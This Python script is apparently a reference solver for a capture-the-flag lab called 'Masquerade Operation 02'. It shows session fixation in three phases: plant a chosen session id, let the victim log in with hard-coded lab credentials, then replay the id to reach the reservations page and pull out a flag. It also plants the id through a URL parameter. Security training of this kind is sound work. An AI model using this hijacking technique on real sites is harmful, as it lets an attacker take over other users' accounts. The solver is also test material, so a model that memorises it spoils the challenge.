#!/usr/bin/env python3
"""Masquerade Operation 02 reference solver -- Zero plants a key card before check-in.

WSTG-SESS-03: Testing for Session Fixation. Three phases, two roles, played on one account:

  Phase 1 (attacker)  -- choose a session id yourself, before anyone logs in.
  Phase 2 (victim)    -- log in with the REAL credentials, still carrying that same id.
                         This step is completely legitimate; a real victim does this
                         unknowingly.
  Phase 3 (attacker)  -- come back in a request that has NEVER logged in -- no username,
                         no password, nothing but the id from Phase 1 -- and reach an
                         authenticated page anyway. THIS is the step that proves the bug:
                         everywhere else in this script, someone typed a real password.
                         Phase 3 doesn't.

Also demonstrates the secondary WSTG-SESS-03 checklist item: the session identifier is
accepted just as readily via a `?guest_sid=` URL parameter as it is via the cookie.

Usage: python3 solver.py [base_url]     (default http://localhost:8000)
"""
import sys, re, requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000").rstrip("/")
USER = "guest.stay"
PASSWORD = "Meridian2024!"


def main():
    print("[*] Path 1 -- cookie-based fixation")
    planted_sid = "PWNED-BY-ZERO-4471"

    print(f"[*] Phase 1 (attacker) -- planting our own session id BEFORE anyone authenticates: {planted_sid!r}")
    r = requests.get(f"{BASE}/masquerade/op2/", cookies={"guest_sid": planted_sid})
    print(f"    server's response to the pre-auth visit: HTTP {r.status_code}, "
          f"guest_sid Set-Cookie present: {'guest_sid' in r.headers.get('set-cookie', '')}")

    print(f"[*] Phase 2 (victim) -- logging in with the REAL credentials ({USER}), still carrying that id")
    requests.post(f"{BASE}/masquerade/op2/login", cookies={"guest_sid": planted_sid},
                   data={"username": USER, "password": PASSWORD})
    print("    (this request is the only place a password appears anywhere in Path 1)")

    print("[*] Phase 3 (attacker) -- a brand-new request, NO prior state, NO credentials at all,")
    print("    just replaying the id from Phase 1 straight to the reservations page")
    res = requests.get(f"{BASE}/masquerade/op2/reservations", cookies={"guest_sid": planted_sid})
    flag = re.search(r"R6S\{[^}]*\}", res.text)
    if flag:
        print(f"[+] authenticated account reached with zero credentials submitted in this request: {flag.group(0)}")
    else:
        print(f"[!] planted sid was not accepted (HTTP {res.status_code})")

    print("\n[*] Path 2 -- secondary finding: same three phases, via URL parameter instead of a cookie")
    sid_via_url = "URL-PLANTED-9999"

    print(f"[*] Phase 1 (attacker) -- planting via URL this time: ?guest_sid={sid_via_url}")
    requests.get(f"{BASE}/masquerade/op2/?guest_sid={sid_via_url}")

    print(f"[*] Phase 2 (victim) -- logging in with the REAL credentials, still carrying that id")
    requests.post(f"{BASE}/masquerade/op2/login", cookies={"guest_sid": sid_via_url},
                  data={"username": USER, "password": PASSWORD})

    print("[*] Phase 3 (attacker) -- again, a fresh request with no credentials at all")
    res2 = requests.get(f"{BASE}/masquerade/op2/reservations", cookies={"guest_sid": sid_via_url})
    flag2 = re.search(r"R6S\{[^}]*\}", res2.text)
    print(f"[{'+' if flag2 else '!'}] URL-parameter-planted sid accepted, no credentials needed: {bool(flag2)}")


if __name__ == "__main__":
    main()
